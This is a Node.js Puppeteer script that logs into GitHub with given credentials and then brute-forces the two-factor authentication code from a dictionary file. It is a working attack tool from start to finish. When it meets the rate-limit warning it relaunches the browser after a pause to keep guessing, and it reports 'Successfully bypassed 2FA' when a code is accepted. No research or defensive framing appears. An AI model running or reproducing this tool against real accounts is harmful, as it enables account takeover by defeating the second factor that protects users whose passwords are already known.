//Dependencies
const Puppeteer = require("puppeteer")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

var G2B = {
    code_index: 0
}

//Functions
G2B.start = async function(){
    const Dictionary = Fs.readFileSync(Self_Args[2], "utf8").split("\n")
    
    if(Dictionary.length == 0){
        console.log("No codes found in the dictionary you specified.")
        process.exit()
    }

    const browser = await Puppeteer.launch({ headless: false, args: ["--disable-setuid-sandbox", "--no-sandbox"] })
    const page = await browser.newPage()

    await page.goto("https://github.com/login", { waitUntil: "domcontentloaded" })
    await page.type("#login_field", Self_Args[0])
    await page.type("#password", Self_Args[1])
    await Promise.all([
        await page.click("#login > div.auth-form-body.mt-3 > form > div > input.btn.btn-primary.btn-block.js-sign-in-button"),
        await page.waitForNavigation({ waitUntil: "domcontentloaded" })
    ])
    
    const page_content = await page.content()

    if(page_content.indexOf("Incorrect username or password") != -1){
        console.log("Unable to login. Invalid username/email/password.")
        await browser.close()
        process.exit()
    }else{
        console.log("Login successfully.")

        Bruteforce()
        async function Bruteforce(){
            if(Dictionary[G2B.code_index].indexOf("//") != -1){
                G2B.code_index += 1
                Bruteforce()
                return
            }else{
                await page.type("#otp", Dictionary[G2B.code_index]).catch(()=>{})

                await page.waitForTimeout(5000)

                const page_content = await page.content()

                if(page_content.indexOf("There have been several failed attempts to sign in from this account or IP address. Please wait a while and try again later.") != -1){
                    console.log("Looks like we are limited.")
                    await browser.close()

                    console.log("Retrying, please wait 10 seconds.")
                    await Delay(10000)

                    G2B.start()
                    return
                }

                if(page_content.indexOf("Two-factor authentication failed.") != -1){
                    console.log(`Invalid code ${Dictionary[G2B.code_index]}`)
                    G2B.code_index += 1
                    Bruteforce()
                    return
                }else{
                    console.log(`Successfully bypassed 2FA. Valid code ${Dictionary[G2B.code_index]}`)
                    return
                }
            } 
        }
    }
}

//Main
if(!Self_Args.length){
    console.log("node index.js <email/username> <password> <dictionary>")
    process.exit()
}

if(!Self_Args[0]){
    console.log("Invalid email/username.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid password.")
    process.exit()
}

if(!Self_Args[2]){
    console.log("Invalid dictionary.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[2])){
    console.log("Invalid dictionary.")
    process.exit()
}

G2B.start()
